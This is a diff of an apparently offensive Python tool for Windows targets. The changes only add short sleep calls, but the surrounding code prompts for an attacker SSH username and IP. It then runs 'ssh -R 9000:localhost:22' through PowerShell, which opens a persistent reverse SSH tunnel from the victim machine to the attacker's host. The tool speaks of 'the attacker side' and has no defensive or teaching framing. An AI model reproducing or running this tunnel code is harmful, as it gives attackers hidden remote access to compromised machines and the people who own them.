@@ -128,13 +128,18 @@ while True:
         print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell before this action!!!")
         while True:
             attackerscriptcontinue=input("Continue? y/n: ")
+            sleep(0.1)
             if attackerscriptcontinue == "n":
                 print("Will not continue...")
+                sleep(0.1)
             elif attackerscriptcontinue == "y":
                 #stating the PS comand to persistent SSH tunnel
                 attackeruser=input("Enter attacker SSH username: ")
+                sleep(0.1)
                 attackerip=input("Enter attacker IP (without port): ")
+                sleep(0.1)
                 correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
+                sleep(0.1)
                 if correctsshinput == "y":
                     ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
                     subprocess.run(["powershell", "-Command", ssh_tunnel], check=True)
@@ -144,11 +149,14 @@ while True:
                     break
                 else:
                     print(" ")
+                    sleep(0.1)
             else:
                 print(" ")
+                sleep(0.1)
                 break
     else:
         print("")
+        sleep(0.1)
 
 #Action 99 = exiting the program
     if action == "99":
